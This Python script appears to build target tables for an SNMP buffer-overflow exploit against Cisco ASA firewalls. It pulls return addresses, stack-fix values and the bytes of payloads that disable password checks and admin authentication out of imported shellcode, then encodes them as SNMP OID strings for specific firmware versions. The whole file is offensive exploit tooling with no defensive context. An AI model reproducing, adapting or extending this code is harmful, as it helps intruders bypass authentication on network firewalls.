from shellcode_asa803_6 import *
#sc = __import__("shellcode_asa803-6")
import binascii

def xor_a5(bytes):
    ret = binascii.hexlify(bytes)
    ret = int(ret, 16)
    ret ^= 0xa5a5a5a5
    return ret

def hex_to_snmp(hex, convert_endian = True):
    #if (len(hex_str) == 7):
#        hex_str = "0" + hex_str
    #print hex_str
    hex_str = "%08x" % hex
    octets = [hex_str[j:j+2] for j in range(0,len(hex_str),2)]
    octets = ".".join(reversed([str(int(i,16)) for i in octets]))
    return octets

#safe_ret_snmp = ".".join(preamble_snmp.split(".")[1:5])
safe_ret_hex = preamble_byte[1:5]
safe_ret_hex = safe_ret_hex[::-1]
safe_ret_hex = xor_a5(safe_ret_hex)
safe_ret_snmp = hex_to_snmp(safe_ret_hex)

stack_clean_snmp = (preamble_snmp.split(".")[0x14])
stack_clean_hex = int(binascii.hexlify(preamble_byte[0x14]), 16)

#pm_bounds_snmp = ".".join(payload_PMCHECK_DISABLE_snmp.split(".")[0xd:0x11])
pm_bounds_hex = payload_PMCHECK_DISABLE_byte[0xd:0x11][::-1]
pm_bounds_hex = xor_a5(pm_bounds_hex)
pm_bounds_snmp = hex_to_snmp(pm_bounds_hex)

pm_addr_snmp = ".".join(payload_PMCHECK_DISABLE_snmp.split(".")[0x26:0x2a])
pm_addr_hex = payload_PMCHECK_DISABLE_byte[0x26:0x2a]
pm_addr_hex = int(binascii.hexlify(pm_addr_hex[::-1]), 16)

#aa_bounds_snmp = ".".join(payload_AAAADMINAUTH_DISABLE_snmp.split(".")[0xd:0x11])
aa_bounds_hex = payload_AAAADMINAUTH_DISABLE_byte[0xd:0x11]
aa_bounds_hex = aa_bounds_hex[::-1]
aa_bounds_hex = xor_a5(aa_bounds_hex)
aa_bounds_snmp = hex_to_snmp(aa_bounds_hex)

aa_addr_snmp = ".".join(payload_AAAADMINAUTH_DISABLE_snmp.split(".")[0x26:0x2a])
aa_addr_hex = payload_AAAADMINAUTH_DISABLE_byte[0x26:0x2a]
aa_addr_hex = int(binascii.hexlify(aa_addr_hex[::-1]), 16)

jmp_esp_snmp = my_ret_addr_snmp
jmp_esp_hex = binascii.hexlify(my_ret_addr_byte[::-1])
jmp_esp_hex = int(jmp_esp_hex, 16)

pm_code_snmp = ".".join(payload_PMCHECK_ENABLE_snmp.split(".")[0x1b:0x1f])
pm_code_hex = 0

aa_code_snmp = ".".join(payload_AAAADMINAUTH_ENABLE_snmp.split(".")[0x1b:0x1f])
aa_code_hex = 0

'''
saferet_offset  = "134.177.3.9"         # 0x0903b186
jmp_esp_offset  = "173.250.27.8"                # 0x081bfaad
admauth_offset  = "96.49.8.8"           # 0x08083160
admauth_bounds  = "0.48.8.8"            # 0x08083000
admauth_code    = "85.137.229.87"               # 0x5589e557
pmcheck_offset  = "176.119.127.9"               # 0x097f77b0
pmcheck_bounds  = "0.112.127.9"         # 0x097f7000
pmcheck_code    = "85.49.192.137"               # 0x5531c089
fix_ebp = "72"          # 0x48
#"VERS" => ["173.250.27.8", "134.177.3.9", "72", "0.112.127.9", "176.119.127.9", "85.49.192.137", "0.48.8.8", "96.49.8.8", "85.137.229.87"]
'''
'''
      "9.2(3)" => ["29.112.29.8",      # jmp_esp_offset, 0
                   "134.115.39.9",     # saferet_offset, 1
                   "72",               # fix_ebp,        2
                   "0.128.183.9",      # pmcheck_bounds, 3
                   "16.128.183.9",     # pmcheck_offset, 4
                   "85.49.192.137",    # pmcheck_code,   5
                   "0.80.8.8",         # admauth_bounds, 6
                   "64.90.8.8",        # admauth_offset, 7
                   "85.137.229.87"],   # admauth_code,   8
'''

print('saferet_offset  = "%s" # 0x%08x' % (safe_ret_snmp, safe_ret_hex))
print('jmp_esp_offset  = "%s" # 0x%08x' % (jmp_esp_snmp, jmp_esp_hex))
print('admauth_offset  = "%s" # 0x%08x' % (aa_addr_snmp, aa_addr_hex))
print('admauth_bounds  = "%s" # 0x%08x' % (aa_bounds_snmp, aa_bounds_hex))
print('admauth_code  = "%s" # 0x%08x' % (aa_code_snmp, aa_code_hex))
print('pmcheck_bounds  = "%s" # 0x%08x' % (pm_bounds_snmp, pm_bounds_hex))
print('pmcheck_offset  = "%s" # 0x%08x' % (pm_addr_snmp, pm_addr_hex))
print('pmcheck_code  = "%s" # 0x%08x' % (pm_code_snmp, pm_code_hex))
print('fix_ebp = "%s"          # 0x%02x' % (stack_clean_snmp, stack_clean_hex))

stuff = (jmp_esp_snmp, safe_ret_snmp, stack_clean_snmp, pm_bounds_snmp, pm_addr_snmp, pm_code_snmp, aa_bounds_snmp, aa_addr_snmp, aa_code_snmp)

print('#"VERS" => ["%s", "%s", "%s", "%s", "%s", "%s", "%s", "%s", "%s"]' % stuff)
